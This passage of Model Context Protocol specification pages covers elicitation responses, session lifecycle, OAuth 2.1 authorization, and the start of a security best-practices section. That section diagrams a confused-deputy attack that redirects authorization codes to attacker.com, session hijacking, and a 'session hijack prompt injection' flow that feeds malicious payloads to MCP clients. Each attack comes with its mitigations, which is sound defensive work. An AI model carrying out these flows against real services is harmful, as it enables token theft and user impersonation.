0,\n     \"maximum\": 100\n   }\n   ```\n\n3. **Boolean Schema**\n\n   ```json\n   {\n     \"type\": \"boolean\",\n     \"title\": \"Display Name\",\n     \"description\": \"Description text\",\n     \"default\": false\n   }\n   ```\n\n4. **Enum Schema**\n   ```json\n   {\n     \"type\": \"string\",\n     \"title\": \"Display Name\",\n     \"description\": \"Description text\",\n     \"enum\": [\"option1\", \"option2\", \"option3\"],\n     \"enumNames\": [\"Option 1\", \"Option 2\", \"Option 3\"]\n   }\n   ```\n\nClients can use this schema to:\n\n1. Generate appropriate input forms\n2. Validate user input before sending\n3. Provide better guidance to users\n\nNote that complex nested structures, arrays of objects, and other advanced JSON Schema features are intentionally not supported to simplify client implementation.\n\n## Response Actions\n\nElicitation responses use a three-action model to clearly distinguish between different user actions:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"action\": \"accept\", // or \"decline\" or \"cancel\"\n    \"content\": {\n      \"propertyName\": \"value\",\n      \"anotherProperty\": 42\n    }\n  }\n}\n```\n\nThe three response actions are:\n\n1. **Accept** (`action: \"accept\"`): User explicitly approved and submitted with data\n   - The `content` field contains the submitted data matching the requested schema\n   - Example: User clicked \"Submit\", \"OK\", \"Confirm\", etc.\n\n2. **Decline** (`action: \"decline\"`): User explicitly declined the request\n   - The `content` field is typically omitted\n   - Example: User clicked \"Reject\", \"Decline\", \"No\", etc.\n\n3. **Cancel** (`action: \"cancel\"`): User dismissed without making an explicit choice\n   - The `content` field is typically omitted\n   - Example: User closed the dialog, clicked outside, pressed Escape, etc.\n\nServers should handle each state appropriately:\n\n- **Accept**: Process the submitted data\n- **Decline**: Handle explicit decline (e.g., offer alternatives)\n- **Cancel**: Handle dismissal (e.g., prompt again later)\n\n## Security Considerations\n\n1. Servers **MUST NOT** request sensitive information through elicitation\n2. Clients **SHOULD** implement user approval controls\n3. Both parties **SHOULD** validate elicitation content against the provided schema\n4. Clients **SHOULD** provide clear indication of which server is requesting information\n5. Clients **SHOULD** allow users to decline elicitation requests at any time\n6. Clients **SHOULD** implement rate limiting\n7. Clients **SHOULD** present elicitation requests in a way that makes it clear what information is being requested and why\n"}

This **SHOULD** be the _latest_ version supported by the server.\n\nIf the client does not support the version in the server's response, it **SHOULD**\ndisconnect.\n\n<Note>\nIf using HTTP, the client **MUST** include the `MCP-Protocol-Version:\n<protocol-version>` HTTP header on all subsequent requests to the MCP\nserver.\nFor details, see [the Protocol Version Header section in Transports](/specification/2025-06-18/basic/transports#protocol-version-header).\n</Note>\n\n#### Capability Negotiation\n\nClient and server capabilities establish which optional protocol features will be\navailable during the session.\n\nKey capabilities include:\n\n| Category | Capability     | Description                                                                               |\n| -------- | -------------- | ----------------------------------------------------------------------------------------- |\n| Client   | `roots`        | Ability to provide filesystem [roots](/specification/2025-06-18/client/roots)             |\n| Client   | `sampling`     | Support for LLM [sampling](/specification/2025-06-18/client/sampling) requests            |\n| Client   | `elicitation`  | Support for server [elicitation](/specification/2025-06-18/client/elicitation) requests   |\n| Client   | `experimental` | Describes support for non-standard experimental features                                  |\n| Server   | `prompts`      | Offers [prompt templates](/specification/2025-06-18/server/prompts)                       |\n| Server   | `resources`    | Provides readable [resources](/specification/2025-06-18/server/resources)                 |\n| Server   | `tools`        | Exposes callable [tools](/specification/2025-06-18/server/tools)                          |\n| Server   | `logging`      | Emits structured [log messages](/specification/2025-06-18/server/utilities/logging)       |\n| Server   | `completions`  | Supports argument [autocompletion](/specification/2025-06-18/server/utilities/completion) |\n| Server   | `experimental` | Describes support for non-standard experimental features                                  |\n\nCapability objects can describe sub-capabilities like:\n\n- `listChanged`: Support for list change notifications (for prompts, resources, and\n  tools)\n- `subscribe`: Support for subscribing to individual items' changes (resources only)\n\n### Operation\n\nDuring the operation phase, the client and server exchange messages according to the\nnegotiated capabilities.\n\nBoth parties **MUST**:\n\n- Respect the negotiated protocol version\n- Only use capabilities that were successfully negotiated\n\n### Shutdown\n\nDuring the shutdown phase, one side (usually the client) cleanly terminates the protocol\nconnection. No specific shutdown messages are defined—instead, the underlying transport\nmechanism should be used to signal connection termination:\n\n#### stdio\n\nFor the stdio [transport](/specification/2025-06-18/basic/transports), the client **SHOULD** initiate\nshutdown by:\n\n1. First, closing the input stream to the child process (the server)\n2. Waiting for the server to exit, or sending `SIGTERM` if the server does not exit\n   within a reasonable time\n3. Sending `SIGKILL` if the server does not exit within a reasonable time after `SIGTERM`\n\nThe server **MAY** initiate shutdown by closing its output stream to the client and\nexiting.\n\n#### HTTP\n\nFor HTTP [transports](/specification/2025-06-18/basic/transports), shutdown is indicated by closing the\nassociated HTTP connection(s).\n\n## Timeouts\n\nImplementations **SHOULD** establish timeouts for all sent requests, to prevent hung\nconnections and resource exhaustion. When the request has not received a success or error\nresponse within the timeout period, the sender **SHOULD** issue a [cancellation\nnotification](/specification/2025-06-18/basic/utilities/cancellation) for that request and stop waiting for\na response.\n\nSDKs and other middleware **SHOULD** allow these timeouts to be configured on a\nper-request basis.\n\nImplementations **MAY** choose to reset the timeout clock when receiving a [progress\nnotification](/specification/2025-06-18/basic/utilities/progress) corresponding to the request, as this\nimplies that work is actually happening. However, implementations **SHOULD** always\nenforce a maximum timeout, regardless of progress notifications, to limit the impact of a\nmisbehaving client or server.\n\n## Error Handling\n\nImplementations **SHOULD** be prepared to handle these error cases:\n\n- Protocol version mismatch\n- Failure to negotiate required capabilities\n- Request [timeouts](#timeouts)\n\nExample initialization error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"error\": {\n    \"code\": -32602,\n    \"message\": \"Unsupported protocol version\",\n    \"data\": {\n      \"supported\": [\"2024-11-05\"],\n      \"requested\": \"1.0.0\"\n    }\n  }\n}\n```\n"}

This specification defines the authorization flow for HTTP-based transports.\n\n### Protocol Requirements\n\nAuthorization is **OPTIONAL** for MCP implementations. When supported:\n\n- Implementations using an HTTP-based transport **SHOULD** conform to this specification.\n- Implementations using an STDIO transport **SHOULD NOT** follow this specification, and\n  instead retrieve credentials from the environment.\n- Implementations using alternative transports **MUST** follow established security best\n  practices for their protocol.\n\n### Standards Compliance\n\nThis authorization mechanism is based on established specifications listed below, but\nimplements a selected subset of their features to ensure security and interoperability\nwhile maintaining simplicity:\n\n- OAuth 2.1 IETF DRAFT ([draft-ietf-oauth-v2-1-13](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13))\n- OAuth 2.0 Authorization Server Metadata\n  ([RFC8414](https://datatracker.ietf.org/doc/html/rfc8414))\n- OAuth 2.0 Dynamic Client Registration Protocol\n  ([RFC7591](https://datatracker.ietf.org/doc/html/rfc7591))\n- OAuth 2.0 Protected Resource Metadata ([RFC9728](https://datatracker.ietf.org/doc/html/rfc9728))\n\n## Authorization Flow\n\n### Roles\n\nA protected _MCP server_ acts as an [OAuth 2.1 resource server](https://www.ietf.org/archive/id/draft-ietf-oauth-v2-1-13.html#name-roles),\ncapable of accepting and responding to protected resource requests using access tokens.\n\nAn _MCP client_ acts as an [OAuth 2.1 client](https://www.ietf.org/archive/id/draft-ietf-oauth-v2-1-13.html#name-roles),\nmaking protected resource requests on behalf of a resource owner.\n\nThe _authorization server_ is responsible for interacting with the user (if necessary) and issuing access tokens for use at the MCP server.\nThe implementation details of the authorization server are beyond the scope of this specification. It may be hosted with the\nresource server or a separate entity. The [Authorization Server Discovery section](#authorization-server-discovery)\nspecifies how an MCP server indicates the location of its corresponding authorization server to a client.\n\n### Overview\n\n1. Authorization servers **MUST** implement OAuth 2.1 with appropriate security\n   measures for both confidential and public clients.\n\n1. Authorization servers and MCP clients **SHOULD** support the OAuth 2.0 Dynamic Client Registration\n   Protocol ([RFC7591](https://datatracker.ietf.org/doc/html/rfc7591)).\n\n1. MCP servers **MUST** implement OAuth 2.0 Protected Resource Metadata ([RFC9728](https://datatracker.ietf.org/doc/html/rfc9728)).\n   MCP clients **MUST** use OAuth 2.0 Protected Resource Metadata for authorization server discovery.\n\n1. Authorization servers **MUST** provide OAuth 2.0 Authorization\n   Server Metadata ([RFC8414](https://datatracker.ietf.org/doc/html/rfc8414)).\n   MCP clients **MUST** use the OAuth 2.0 Authorization Server Metadata.\n\n### Authorization Server Discovery\n\nThis section describes the mechanisms by which MCP servers advertise their associated\nauthorization servers to MCP clients, as well as the discovery process through which MCP\nclients can determine authorization server endpoints and supported capabilities.\n\n#### Authorization Server Location\n\nMCP servers **MUST** implement the OAuth 2.0 Protected Resource Metadata ([RFC9728](https://datatracker.ietf.org/doc/html/rfc9728))\nspecification to indicate the locations of authorization servers. The Protected Resource Metadata document returned by the MCP server **MUST** include\nthe `authorization_servers` field containing at least one authorization server.\n\nThe specific use of `authorization_servers` is beyond the scope of this specification; implementers should consult\nOAuth 2.0 Protected Resource Metadata ([RFC9728](https://datatracker.ietf.org/doc/html/rfc9728)) for\nguidance on implementation details.\n\nImplementors should note that Protected Resource Metadata documents can define multiple authorization servers. The responsibility for selecting which authorization server to use lies with the MCP client, following the guidelines specified in\n[RFC9728 Section 7.6 \"Authorization Servers\"](https://datatracker.ietf.org/doc/html/rfc9728#name-authorization-servers).\n\nMCP servers **MUST** use the HTTP header `WWW-Authenticate` when returning a _401 Unauthorized_ to indicate the location of the resource server metadata URL\nas described in [RFC9728 Section 5.1 \"WWW-Authenticate Response\"](https://datatracker.ietf.org/doc/html/rfc9728#name-www-authenticate-response).\n\nMCP clients **MUST** be able to parse `WWW-Authenticate` headers and respond appropriately to `HTTP 401 Unauthorized` responses from the MCP server.\n\n#### Server Metadata Discovery\n\nMCP clients **MUST** follow the OAuth 2.0 Authorization Server Metadata [RFC8414](https://datatracker.ietf.org/doc/html/rfc8414)\nspecification to obtain the information required to interact with the authorization server.\n\n#### Sequence Diagram\n\nThe following diagram outlines an example flow:\n\n```mermaid\nsequenceDiagram\n    participant C as Client\n    participant M as MCP Server (Resource Server)\n    participant A as Authorization Server\n\n    C->>M: MCP request without token\n    M-->>C: HTTP 401 Unauthorized with WWW-Authenticate header\n    Note over C: Extract resource_metadata<br />from WWW-Authenticate\n\n    C->>M: GET /.well-known/oauth-protected-resource\n    M-->>C: Resource metadata with authorization server URL\n    Note over C: Validate RS metadata,<br />build AS metadata URL\n\n    C->>A: GET /.well-known/oauth-authorization-server\n    A-->>C: Authorization server metadata\n\n    Note over C,A: OAuth 2.1 authorization flow happens here\n\n    C->>A: Token request\n    A-->>C: Access token\n\n    C->>M: MCP request with access token\n    M-->>C: MCP response\n    Note over C,M: MCP communication continues with valid token\n```\n\n### Dynamic Client Registration\n\nMCP clients and authorization servers **SHOULD** support the\nOAuth 2.0 Dynamic Client Registration Protocol [RFC7591](https://datatracker.ietf.org/doc/html/rfc7591)\nto allow MCP clients to obtain OAuth client IDs without user interaction. This provides a\nstandardized way for clients to automatically register with new authorization servers, which is crucial\nfor MCP because:\n\n- Clients may not know all possible MCP servers and their authorization servers in advance.\n- Manual registration would create friction for users.\n- It enables seamless connection to new MCP servers and their authorization servers.\n- Authorization servers can implement their own registration policies.\n\nAny authorization servers that _do not_ support Dynamic Client Registration need to provide\nalternative ways to obtain a client ID (and, if applicable, client credentials). For one of\nthese authorization servers, MCP clients will have to either:\n\n1. Hardcode a client ID (and, if applicable, client credentials) specifically for the MCP client to use when\n   interacting with that authorization server, or\n2. Present a UI to users that allows them to enter these details, after registering an\n   OAuth client themselves (e.g., through a configuration interface hosted by the\n   server).\n\n### Authorization Flow Steps\n\nThe complete Authorization flow proceeds as follows:\n\n```mermaid\nsequenceDiagram\n    participant B as User-Agent (Browser)\n    participant C as Client\n    participant M as MCP Server (Resource Server)\n    participant A as Authorization Server\n\n    C->>M: MCP request without token\n    M->>C: HTTP 401 Unauthorized with WWW-Authenticate header\n    Note over C: Extract resource_metadata URL from WWW-Authenticate\n\n    C->>M: Request Protected Resource Metadata\n    M->>C: Return metadata\n\n    Note over C: Parse metadata and extract authorization server(s)<br/>Client determines AS to use\n\n    C->>A: GET /.well-known/oauth-authorization-server\n    A->>C: Authorization server metadata response\n\n    alt Dynamic client registration\n        C->>A: POST /register\n        A->>C: Client Credentials\n    end\n\n    Note over C: Generate PKCE parameters<br/>Include resource parameter\n    C->>B: Open browser with authorization URL + code_challenge + resource\n    B->>A: Authorization request with resource parameter\n    Note over A: User authorizes\n    A->>B: Redirect to callback with authorization code\n    B->>C: Authorization code callback\n    C->>A: Token request + code_verifier + resource\n    A->>C: Access token (+ refresh token)\n    C->>M: MCP request with access token\n    M-->>C: MCP response\n    Note over C,M: MCP communication continues with valid token\n```\n\n#### Resource Parameter Implementation\n\nMCP clients **MUST** implement Resource Indicators for OAuth 2.0 as defined in [RFC 8707](https://www.rfc-editor.org/rfc/rfc8707.html)\nto explicitly specify the target resource for which the token is being requested. The `resource` parameter:\n\n1. **MUST** be included in both authorization requests and token requests.\n2. **MUST** identify the MCP server that the client intends to use the token with.\n3. **MUST** use the canonical URI of the MCP server as defined in [RFC 8707 Section 2](https://www.rfc-editor.org/rfc/rfc8707.html#name-access-token-request).\n\n##### Canonical Server URI\n\nFor the purposes of this specification, the canonical URI of an MCP server is defined as the resource identifier as specified in\n[RFC 8707 Section 2](https://www.rfc-editor.org/rfc/rfc8707.html#section-2) and aligns with the `resource` parameter in\n[RFC 9728](https://datatracker.ietf.org/doc/html/rfc9728).\n\nMCP clients **SHOULD** provide the most specific URI that they can for the MCP server they intend to access, following the guidance in [RFC 8707](https://www.rfc-editor.org/rfc/rfc8707). While the canonical form uses lowercase scheme and host components, implementations **SHOULD** accept uppercase scheme and host components for robustness and interoperability.\n\nExamples of valid canonical URIs:\n\n- `https://mcp.example.com/mcp`\n- `https://mcp.example.com`\n- `https://mcp.example.com:8443`\n- `https://mcp.example.com/server/mcp` (when path component is necessary to identify individual MCP server)\n\nExamples of invalid canonical URIs:\n\n- `mcp.example.com` (missing scheme)\n- `https://mcp.example.com#fragment` (contains fragment)\n\n> **Note:** While both `https://mcp.example.com/` (with trailing slash) and `https://mcp.example.com` (without trailing slash) are technically valid absolute URIs according to [RFC 3986](https://www.rfc-editor.org/rfc/rfc3986), implementations **SHOULD** consistently use the form without the trailing slash for better interoperability unless the trailing slash is semantically significant for the specific resource.\n\nFor example, if accessing an MCP server at `https://mcp.example.com`, the authorization request would include:\n\n```\n&resource=https%3A%2F%2Fmcp.example.com\n```\n\nMCP clients **MUST** send this parameter regardless of whether authorization servers support it.\n\n### Access Token Usage\n\n#### Token Requirements\n\nAccess token handling when making requests to MCP servers **MUST** conform to the requirements defined in\n[OAuth 2.1 Section 5 \"Resource Requests\"](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5).\nSpecifically:\n\n1. MCP client **MUST** use the Authorization request header field defined in\n   [OAuth 2.1 Section 5.1.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5.1.1):\n\n```\nAuthorization: Bearer <access-token>\n```\n\nNote that authorization **MUST** be included in every HTTP request from client to server,\neven if they are part of the same logical session.\n\n2. Access tokens **MUST NOT** be included in the URI query string\n\nExample request:\n\n```http\nGET /mcp HTTP/1.1\nHost: mcp.example.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIs...\n```\n\n#### Token Handling\n\nMCP servers, acting in their role as an OAuth 2.1 resource server, **MUST** validate access tokens as described in\n[OAuth 2.1 Section 5.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5.2).\nMCP servers **MUST** validate that access tokens were issued specifically for them as the intended audience,\naccording to [RFC 8707 Section 2](https://www.rfc-editor.org/rfc/rfc8707.html#section-2).\nIf validation fails, servers **MUST** respond according to\n[OAuth 2.1 Section 5.3](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5.3)\nerror handling requirements. Invalid or expired tokens **MUST** receive a HTTP 401\nresponse.\n\nMCP clients **MUST NOT** send tokens to the MCP server other than ones issued by the MCP server's authorization server.\n\nAuthorization servers **MUST** only accept tokens that are valid for use with their\nown resources.\n\nMCP servers **MUST NOT** accept or transit any other tokens.\n\n### Error Handling\n\nServers **MUST** return appropriate HTTP status codes for authorization errors:\n\n| Status Code | Description  | Usage                                      |\n| ----------- | ------------ | ------------------------------------------ |\n| 401         | Unauthorized | Authorization required or token invalid    |\n| 403         | Forbidden    | Invalid scopes or insufficient permissions |\n| 400         | Bad Request  | Malformed authorization request            |\n\n## Security Considerations\n\nImplementations **MUST** follow OAuth 2.1 security best practices as laid out in [OAuth 2.1 Section 7. \"Security Considerations\"](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#name-security-considerations).\n\n### Token Audience Binding and Validation\n\n[RFC 8707](https://www.rfc-editor.org/rfc/rfc8707.html) Resource Indicators provide critical security benefits by binding tokens to their intended\naudiences **when the Authorization Server supports the capability**. To enable current and future adoption:\n\n- MCP clients **MUST** include the `resource` parameter in authorization and token requests as specified in the [Resource Parameter Implementation](#resource-parameter-implementation) section\n- MCP servers **MUST** validate that tokens presented to them were specifically issued for their use\n\nThe [Security Best Practices document](/specification/2025-06-18/basic/security_best_practices#token-passthrough)\noutlines why token audience validation is crucial and why token passthrough is explicitly forbidden.\n\n### Token Theft\n\nAttackers who obtain tokens stored by the client, or tokens cached or logged on the server can access protected resources with\nrequests that appear legitimate to resource servers.\n\nClients and servers **MUST** implement secure token storage and follow OAuth best practices,\nas outlined in [OAuth 2.1, Section 7.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-7.1).\n\nAuthorization servers **SHOULD** issue short-lived access tokens to reduce the impact of leaked tokens.\nFor public clients, authorization servers **MUST** rotate refresh tokens as described in [OAuth 2.1 Section 4.3.1 \"Token Endpoint Extension\"](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-4.3.1).\n\n### Communication Security\n\nImplementations **MUST** follow [OAuth 2.1 Section 1.5 \"Communication Security\"](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-1.5).\n\nSpecifically:\n\n1. All authorization server endpoints **MUST** be served over HTTPS.\n1. All redirect URIs **MUST** be either `localhost` or use HTTPS.\n\n### Authorization Code Protection\n\nAn attacker who has gained access to an authorization code contained in an authorization response can try to redeem the authorization code for an access token or otherwise make use of the authorization code.\n(Further described in [OAuth 2.1 Section 7.5](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-7.5))\n\nTo mitigate this, MCP clients **MUST** implement PKCE according to [OAuth 2.1 Section 7.5.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-7.5.2).\nPKCE helps prevent authorization code interception and injection attacks by requiring clients to create a secret verifier-challenge pair, ensuring that only the original requestor can exchange an authorization code for tokens.\n\n### Open Redirection\n\nAn attacker may craft malicious redirect URIs to direct users to phishing sites.\n\nMCP clients **MUST** have redirect URIs registered with the authorization server.\n\nAuthorization servers **MUST** validate exact redirect URIs against pre-registered values to prevent redirection attacks.\n\nMCP clients **SHOULD** use and verify state parameters in the authorization code flow\nand discard any results that do not include or have a mismatch with the original state.\n\nAuthorization servers **MUST** take precautions to prevent redirecting user agents to untrusted URI's, following suggestions laid out in [OAuth 2.1 Section 7.12.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-7.12.2)\n\nAuthorization servers **SHOULD** only automatically redirect the user agent if it trusts the redirection URI. If the URI is not trusted, the authorization server MAY inform the user and rely on the user to make the correct decision.\n\n### Confused Deputy Problem\n\nAttackers can exploit MCP servers acting as intermediaries to third-party APIs, leading to [confused deputy vulnerabilities](/specification/2025-06-18/basic/security_best_practices#confused-deputy-problem).\nBy using stolen authorization codes, they can obtain access tokens without user consent.\n\nMCP proxy servers using static client IDs **MUST** obtain user consent for each dynamically\nregistered client before forwarding to third-party authorization servers (which may require additional consent).\n\n### Access Token Privilege Restriction\n\nAn attacker can gain unauthorized access or otherwise compromise an MCP server if the server accepts tokens issued for other resources.\n\nThis vulnerability has two critical dimensions:\n\n1. **Audience validation failures.** When an MCP server doesn't verify that tokens were specifically intended for it (for example, via the audience claim, as mentioned in [RFC9068](https://www.rfc-editor.org/rfc/rfc9068.html)), it may accept tokens originally issued for other services. This breaks a fundamental OAuth security boundary, allowing attackers to reuse legitimate tokens across different services than intended.\n2. **Token passthrough.** If the MCP server not only accepts tokens with incorrect audiences but also forwards these unmodified tokens to downstream services, it can potentially cause the [\"confused deputy\" problem](#confused-deputy-problem), where the downstream API may incorrectly trust the token as if it came from the MCP server or assume the token was validated by the upstream API. See the [Token Passthrough section](/specification/2025-06-18/basic/security_best_practices#token-passthrough) of the Security Best Practices guide for additional details.\n\nMCP servers **MUST** validate access tokens before processing the request, ensuring the access token is issued specifically for the MCP server, and take all necessary steps to ensure no data is returned to unauthorized parties.\n\nA MCP server **MUST** follow the guidelines in [OAuth 2.1 - Section 5.2](https://www.ietf.org/archive/id/draft-ietf-oauth-v2-1-13.html#section-5.2) to validate inbound tokens.\n\nMCP servers **MUST** only accept tokens specifically intended for themselves and **MUST** reject tokens that do not include them in the audience claim or otherwise verify that they are the intended recipient of the token. See the [Security Best Practices Token Passthrough section](/specification/2025-06-18/basic/security_best_practices#token-passthrough) for details.\n\nIf the MCP server makes requests to upstream APIs, it may act as an OAuth client to them. The access token used at the upstream API is a separate token, issued by the upstream authorization server. The MCP server **MUST NOT** pass through the token it received from the MCP client.\n\nMCP clients **MUST** implement and use the `resource` parameter as defined in [RFC 8707 - Resource Indicators for OAuth 2.0](https://www.rfc-editor.org/rfc/rfc8707.html)\nto explicitly specify the target resource for which the token is being requested. This requirement aligns with the recommendation in\n[RFC 9728 Section 7.4](https://datatracker.ietf.org/doc/html/rfc9728#section-7.4). This ensures that access tokens are bound to their intended resources and\ncannot be misused across different services.\n"}

This document identifies security risks, attack vectors, and best practices specific to MCP implementations.\n\nThe primary audience for this document includes developers implementing MCP authorization flows, MCP server operators, and security professionals evaluating MCP-based systems. This document should be read alongside the MCP Authorization specification and [OAuth 2.0 security best practices](https://datatracker.ietf.org/doc/html/rfc9700).\n\n## Attacks and Mitigations\n\nThis section gives a detailed description of attacks on MCP implementations, along with potential countermeasures.\n\n### Confused Deputy Problem\n\nAttackers can exploit MCP servers proxying other resource servers, creating \"[confused deputy](https://en.wikipedia.org/wiki/Confused_deputy_problem)\" vulnerabilities.\n\n#### Terminology\n\n**MCP Proxy Server**\n: An MCP server that connects MCP clients to third-party APIs, offering MCP features while delegating operations and acting as a single OAuth client to the third-party API server.\n\n**Third-Party Authorization Server**\n: Authorization server that protects the third-party API. It may lack dynamic client registration support, requiring MCP proxy to use a static client ID for all requests.\n\n**Third-Party API**\n: The protected resource server that provides the actual API functionality. Access to this\nAPI requires tokens issued by the third-party authorization server.\n\n**Static Client ID**\n: A fixed OAuth 2.0 client identifier used by the MCP proxy server when communicating with\nthe third-party authorization server. This Client ID refers to the MCP server acting as a client\nto the Third-Party API. It is the same value for all MCP server to Third-Party API interactions regardless of\nwhich MCP client initiated the request.\n\n#### Architecture and Attack Flows\n\n##### Normal OAuth proxy usage (preserves user consent)\n\n```mermaid\nsequenceDiagram\n    participant UA as User-Agent (Browser)\n    participant MC as MCP Client\n    participant M as MCP Proxy Server\n    participant TAS as Third-Party Authorization Server\n\n    Note over UA,M: Initial Auth flow completed\n\n    Note over UA,TAS: Step 1: Legitimate user consent for Third Party Server\n\n    M->>UA: Redirect to third party authorization server\n    UA->>TAS: Authorization request (client_id: mcp-proxy)\n    TAS->>UA: Authorization consent screen\n    Note over UA: Review consent screen\n    UA->>TAS: Approve\n    TAS->>UA: Set consent cookie for client ID: mcp-proxy\n    TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com\n    UA->>M: 3P Authorization code\n    Note over M,TAS: Exchange 3P code for 3P token\n    Note over M: Generate MCP authorization code\n    M->>UA: Redirect to MCP Client with MCP authorization code\n\n    Note over M,UA: Exchange code for token, etc.\n```\n\n##### Malicious OAuth proxy usage (skips user consent)\n\n```mermaid\nsequenceDiagram\n    participant UA as User-Agent (Browser)\n    participant M as MCP Proxy Server\n    participant TAS as Third-Party Authorization Server\n    participant A as Attacker\n\n\n    Note over UA,A: Step 2: Attack (leveraging existing cookie, skipping consent)\n    A->>M: Dynamically register malicious client, redirect_uri: attacker.com\n    A->>UA: Sends malicious link\n    UA->>TAS: Authorization request (client_id: mcp-proxy) + consent cookie\n    rect rgba(255, 17, 0, 0.67)\n    TAS->>TAS: Cookie present, consent skipped\n    end\n\n   TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com\n   UA->>M: 3P Authorization code\n   Note over M,TAS: Exchange 3P code for 3P token\n   Note over M: Generate MCP authorization code\n   M->>UA: Redirect to attacker.com with MCP Authorization code\n   UA->>A: MCP Authorization code delivered to attacker.com\n   Note over M,A: Attacker exchanges MCP code for MCP token\n   A->>M: Attacker impersonates user to MCP server\n```\n\n#### Attack Description\n\nWhen an MCP proxy server uses a static client ID to authenticate with a third-party\nauthorization server that does not support dynamic client registration, the following\nattack becomes possible:\n\n1. A user authenticates normally through the MCP proxy server to access the third-party API\n2. During this flow, the third-party authorization server sets a cookie on the user agent\n   indicating consent for the static client ID\n3. An attacker later sends the user a malicious link containing a crafted authorization request which contains a malicious redirect URI along with a new dynamically registered client ID\n4. When the user clicks the link, their browser still has the consent cookie from the previous legitimate request\n5. The third-party authorization server detects the cookie and skips the consent screen\n6. The MCP authorization code is redirected to the attacker's server (specified in the crafted redirect_uri during dynamic client registration)\n7. The attacker exchanges the stolen authorization code for access tokens for the MCP server without the user's explicit approval\n8. Attacker now has access to the third-party API as the compromised user\n\n#### Mitigation\n\nMCP proxy servers using static client IDs **MUST** obtain user consent for each dynamically\nregistered client before forwarding to third-party authorization servers (which may require additional consent).\n\n### Token Passthrough\n\n\"Token passthrough\" is an anti-pattern where an MCP server accepts tokens from an MCP client without validating that the tokens were properly issued _to the MCP server_ and \"passing them through\" to the downstream API.\n\n#### Risks\n\nToken passthrough is explicitly forbidden in the [authorization specification](/specification/2025-06-18/basic/authorization) as it introduces a number of security risks, that include:\n\n- **Security Control Circumvention**\n  - The MCP Server or downstream APIs might implement important security controls like rate limiting, request validation, or traffic monitoring, that depend on the token audience or other credential constraints. If clients can obtain and use tokens directly with the downstream APIs without the MCP server validating them properly or ensuring that the tokens are issued for the right service, they bypass these controls.\n- **Accountability and Audit Trail Issues**\n  - The MCP Server will be unable to identify or distinguish between MCP Clients when clients are calling with an upstream-issued access token which may be opaque to the MCP Server.\n  - The downstream Resource Server’s logs may show requests that appear to come from a different source with a different identity, rather than the MCP server that is actually forwarding the tokens.\n  - Both factors make incident investigation, controls, and auditing more difficult.\n  - If the MCP Server passes tokens without validating their claims (e.g., roles, privileges, or audience) or other metadata, a malicious actor in possession of a stolen token can use the server as a proxy for data exfiltration.\n- **Trust Boundary Issues**\n  - The downstream Resource Server grants trust to specific entities. This trust might include assumptions about origin or client behavior patterns. Breaking this trust boundary could lead to unexpected issues.\n  - If the token is accepted by multiple services without proper validation, an attacker compromising one service can use the token to access other connected services.\n- **Future Compatibility Risk**\n  - Even if an MCP Server starts as a \"pure proxy\" today, it might need to add security controls later. Starting with proper token audience separation makes it easier to evolve the security model.\n\n#### Mitigation\n\nMCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server.\n\n### Session Hijacking\n\nSession hijacking is an attack vector where a client is provided a session ID by the server, and an unauthorized party is able to obtain and use that same session ID to impersonate the original client and perform unauthorized actions on their behalf.\n\n#### Session Hijack Prompt Injection\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant ServerA\n    participant Queue\n    participant ServerB\n    participant Attacker\n\n    Client->>ServerA: Initialize (connect to streamable HTTP server)\n    ServerA-->>Client: Respond with session ID\n\n    Attacker->>ServerB: Access/guess session ID\n    Note right of Attacker: Attacker knows/guesses session ID\n\n    Attacker->>ServerB: Trigger event (malicious payload, using session ID)\n    ServerB->>Queue: Enqueue event (keyed by session ID)\n\n    ServerA->>Queue: Poll for events (using session ID)\n    Queue-->>ServerA: Event data (malicious payload)\n\n    ServerA-->>Client: Async response (malicious payload)\n    Client->>Client: Acts based on malicious payload\n```\n\n#### Session Hijack Impersonation\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n    participant Attacker\n\n    Client->>Server: Initialize (login/authenticate)\n    Server-->>Client: Respond with session ID (persistent session created)\n\n    Attacker->>Server: Access/guess session ID\n    Note right of Attacker: Attacker knows/guesses session ID\n\n    Attacker->>Server: Make API call (using session ID, no re-auth)\n    Server-->>Attacker: Respond as if Attacker is Client (session hijack)\n```\n\n#### Attack Description\n\nWhen you have multiple stateful HTTP servers that handle MCP requests, the following attack vectors are possible:\n\n**Session Hijack Prompt Injection**\n\n1. The client connects to **Server A** and receives a session ID.\n1. The attacker obtains an existing session ID and sends a malicious event to **Server B** with said session ID.\n   - When a server supports [redelivery/resumable streams](/specification/2025-06-18/basic/transports#resumability-and-redelivery), deliberately terminating the request before receiving the response could lead to it being resumed by the original client via the GET request for server sent events.\n   - If a particular server initiates server sent events as a consequence of a tool call such as a `notifications/tools/list_changed`, where it is possible to affect the tools that are offered by the server, a client could end up with tools that they were not aware were enabled.\n\n1. **Server B** enqueues the event (associated with session ID) into a shared queue.\n1. **Server A** polls the queue for events using the session ID and retrieves the malicious payload.\n1. **Server A** sends the malicious payload to the client as an asynchronous or resumed response.\n1. The client receives and acts on the malicious payload, leading to potential compromise.\n\n**Session Hijack Impersonation**\n\n1. The MCP client authenticates with the MCP server, creating a persistent session ID.\n2. The attacker obtains the session ID.\n3. The attacker makes calls to the MCP server using the session ID.\n4. MCP server does not check for additional authorization and treats the attacker as a legitimate user, allowing unauthorized access or actions.\n\n#### Mitigation\n\nTo prevent session hijacking and event injection attacks, 